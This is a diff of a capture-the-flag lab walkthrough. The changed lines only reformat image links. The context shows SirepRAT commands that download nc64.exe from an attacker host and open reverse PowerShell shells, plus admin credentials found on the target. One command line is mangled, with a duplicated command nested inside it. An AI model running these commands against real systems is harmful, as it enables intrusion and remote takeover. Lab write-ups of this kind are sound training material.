@@ -55,7 +55,7 @@ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C
 
 This will tell us where our flags are located, thus giving us an idea of our targets and some user account info.
 
-{{< figure src="__GHOST_URL__/content/images/2020/10/image-31.png" >}}
+![](/images/2020/10/image-31.png)
 
 Now we know some basic info and what we're after. How do we obtain it? We have the ability to upload files to the system, in this case we can upload `nc.exe` and get a shell back to us. Now there are a few things to remember in this case. We need a place to put it where we have access, luckily we [know those](https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets#applocker-writable-windows-directories). We also need to ensure we format our command correctly and have a `SimpleHTTPServer` running on port 80.
 
@@ -64,7 +64,7 @@ Command:
 python2 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell Invoke-Webrequest -outfile C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe -uri 10.10.14.169/nc64.exe" --v
 ```
 
-{{< figure src="__GHOST_URL__/content/images/2020/11/image.png" >}}
+![](/images/2020/11/image.png)
 
 We see that our `nc64.exe` file was downloaded to the location we specified. now we simply need to execute the application to shell back to us. First we'll start up out `netcat` listener.
 
@@ -78,7 +78,7 @@ Command:
 python2 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c C:\\Windows\\System32\\spool\\drivers\\> python2 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe 10.10.14.169 6666 -e powershell.exe" --v
 ```
 
-{{< figure src="__GHOST_URL__/content/images/2020/11/image-1.png" >}}
+![](/images/2020/11/image-1.png)
 
 We get our shell back instantly. Now we'll download an enumeration script and see what we can find. In this case we downloaded `WinPEAS`.
 
@@ -97,15 +97,15 @@ Command:
 
 This finds an interesting file - `r.bat` - in an interesting location.
 
-{{< figure src="__GHOST_URL__/content/images/2020/11/image-2.png" >}}
+![](/images/2020/11/image-2.png)
 
 When we look in the file, we see some credentials!
 
-{{< figure src="__GHOST_URL__/content/images/2020/11/image-3.png" >}}
+![](/images/2020/11/image-3.png)
 
 Now with some credentials, we can try to access that page being hosted on `8080`. Sure enough, we get in!
 
-{{< figure src="__GHOST_URL__/content/images/2020/11/image-4.png" >}}
+![](/images/2020/11/image-4.png)
 
 Now poking around this system, we see there is a function to run commands. Well great but it's possible that we are going to only run our command as our current user. Now, we can try to login to this portal as the administrator credentials that we just found. Sure enough, they work! Now, we can run commands as administrator! Let's create another shell back, this time with admin priv's.
 
@@ -117,11 +117,11 @@ We also want to ensure that we have our listener running.
 Command:
 `nc -lvnp 7777`
 
-{{< figure src="__GHOST_URL__/content/images/2020/11/image-5.png" >}}
+![](/images/2020/11/image-5.png)
 
 Sure enough, we catch our shell back!
 
-{{< figure src="__GHOST_URL__/content/images/2020/11/image-6.png" >}}
+![](/images/2020/11/image-6.png)
 
 With admin at our disposal, we check the `root.txt` file. Looks like it's a XML file that needs to be run through powershell to get the value. Fun. We can quickly get our value by using `import-clixml`, you can read up on that [here](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/import-clixml?view=powershell-7).
 
